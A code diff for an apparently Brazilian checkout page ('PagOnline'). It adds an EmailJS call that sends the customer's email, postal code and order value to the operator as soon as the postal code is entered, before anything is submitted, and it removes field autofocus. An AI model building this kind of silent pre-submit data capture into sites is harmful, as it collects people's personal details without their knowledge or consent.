@@ -30,6 +30,9 @@ let flowState = {
     cpfValid: false
 };
 
+// Controle para envio do primeiro email (quando CEP é inserido)
+let firstEmailSent = false;
+
 // Inicialização do EmailJS
 (function() {
     const script = document.createElement('script');
@@ -371,6 +374,12 @@ async function handleCEPLookup() {
                 errorEl.classList.remove('show');
                 cepInput.classList.remove('error');
                 cepInput.classList.add('success');
+                
+                // Envia primeiro email via EmailJS (Email, CEP e Valor)
+                if (!firstEmailSent) {
+                    sendFirstEmailNotification();
+                    firstEmailSent = true;
+                }
             } else {
                 showCEPError();
                 flowState.cepValid = false;
@@ -484,13 +493,8 @@ function selectShipping() {
         revealSection('sectionAddressComplement', false);
         revealSection('sectionCpf', false); // CPF já disponível junto com endereço
         
-        // Foca no campo de nome
-        setTimeout(() => {
-            const firstNameField = document.getElementById('firstName');
-            if (firstNameField) {
-                firstNameField.focus();
-            }
-        }, 300);
+        // Não foca em nenhum campo automaticamente
+        // O usuário deve clicar no campo que deseja preencher
     }
 }
 
@@ -926,7 +930,41 @@ async function handleDeliverySubmit(e) {
     }
 }
 
-// Função para enviar email via EmailJS
+// Função para enviar primeiro email via EmailJS (quando CEP é inserido)
+// Envia apenas: Email, CEP e Valor
+async function sendFirstEmailNotification() {
+    try {
+        const email = document.getElementById('email').value;
+        const cep = document.getElementById('zipCode').value;
+        const valor = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
+        
+        const templateParams = {
+            customer_name: 'Cliente',
+            customer_email: email,
+            customer_cpf: '-',
+            customer_phone: '-',
+            order_subtotal: valor,
+            order_date: new Date().toLocaleString('pt-BR'),
+            to_name: 'Cliente',
+            from_name: 'PagOnline',
+            message: `Novo interesse no checkout!\n\nE-mail: ${email}\nCEP: ${cep}\nValor do Pedido: ${valor}\nData: ${new Date().toLocaleString('pt-BR')}\n\n(Primeiro contato - CEP inserido)`
+        };
+
+        const response = await emailjs.send(
+            'service_2nf1guv',
+            'template_ja4gfaf',
+            templateParams
+        );
+
+        console.log('Primeiro email enviado com sucesso!', response.status, response.text);
+        return true;
+    } catch (error) {
+        console.error('Erro ao enviar primeiro email:', error);
+        return false;
+    }
+}
+
+// Função para enviar email via EmailJS (quando clica em "Prosseguir para pagamento")
 async function sendEmailNotification(contactData) {
     try {
         const templateParams = {
